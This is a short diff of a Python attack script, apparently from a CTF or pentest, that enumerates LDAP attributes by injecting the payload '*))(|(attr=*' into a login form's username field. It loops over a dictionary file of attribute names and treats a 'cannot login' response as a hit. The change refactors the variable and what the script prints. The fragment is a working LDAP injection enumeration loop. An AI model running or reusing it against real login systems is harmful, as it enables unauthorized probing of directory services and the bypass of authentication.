@@ -28,7 +28,8 @@ postparam = {"inputUsername": None, "inputOTP": None}
 
 dictfile = open('common_ldap_attr.dic', 'r')
 for datas in dictfile.readlines():
-    usrname = '*))(|({todoattr}=*'.format(todoattr=datas.strip())
+    finalattr = datas.strip()
+    usrname = '*))(|({todoattr}=*'.format(todoattr=finalattr)
     postparam["inputUsername"] = urlencode(usrname)
     postparam["inputOTP"] = str(random.randint(10000000, 99999999))
     sess = requests.session()
@@ -37,7 +38,7 @@ for datas in dictfile.readlines():
         time.sleep(1)
         r = sess.post(finaluri, data=postparam)
         if 'cannot login' in r.text.lower():
-            print("-[+] Attribute Exists: " + usrname)
+            print("-[+] Attribute Exists: " + finalattr)
         else:
             pass
     except requests.exceptions.ConnectionError as ce:
